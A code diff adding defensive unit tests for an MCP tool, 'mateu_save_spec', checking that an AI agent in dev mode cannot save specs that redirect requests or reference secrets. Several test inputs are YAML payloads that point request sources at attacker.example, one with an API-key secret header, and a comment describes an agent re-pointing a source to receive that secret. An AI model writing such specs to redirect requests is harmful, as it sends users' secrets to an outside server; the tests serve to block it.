@@ -387,6 +387,40 @@ public class McpAuthoringTests
         Assert.Equal(Page, File.ReadAllText(Path.Combine(dir, "partials", "greeting.yaml")));
     }
 
+    // NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
+    // cannot re-point a proxied source at its own server and have Mateu send it the secret.
+    [Theory]
+    [InlineData("pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n")]
+    [InlineData("prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n")]
+    [InlineData("r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n")]
+    [InlineData("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: ${secret.API_KEY}\n")]
+    [InlineData("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    proxy: true\n")]
+    [InlineData("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n")]
+    public void Save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(string path, string yaml)
+    {
+        var dir = TempDir();
+        var (_, text) = Tool(Service(), "mateu_save_spec",
+            new JsonObject { ["path"] = path, ["yaml"] = yaml }, dev: true, specsDir: dir);
+        var result = JsonNode.Parse(text)!;
+        Assert.False(result["saved"]!.GetValue<bool>());
+        var reason = (string)result["reason"]!;
+        Assert.True(reason.StartsWith("Only a page, a partial or a business-component catalogue can be saved by an agent;")
+                    || reason.StartsWith("A definition saved by an agent may not reference a secret,"), reason);
+        Assert.False(File.Exists(Path.Combine(dir, path)));
+    }
+
+    [Theory]
+    [InlineData("sources.yaml")]
+    [InlineData("x/routes.yml")]
+    [InlineData("environments/prod.yaml")]
+    public void Save_spec_refuses_a_catalogue_file_whatever_it_holds(string path)
+    {
+        var dir = TempDir();
+        Assert.Equal((true, "Error: Refused path \"" + path + "\": catalogue files (sources, routes, actions, types, project, environments, translations) are written by hand."),
+            Tool(Service(), "mateu_save_spec", new JsonObject { ["path"] = path, ["yaml"] = Page }, dev: true, specsDir: dir));
+        Assert.False(File.Exists(Path.Combine(dir, path)));
+    }
+
     [Fact]
     public void Save_spec_writes_nothing_with_errors()
     {
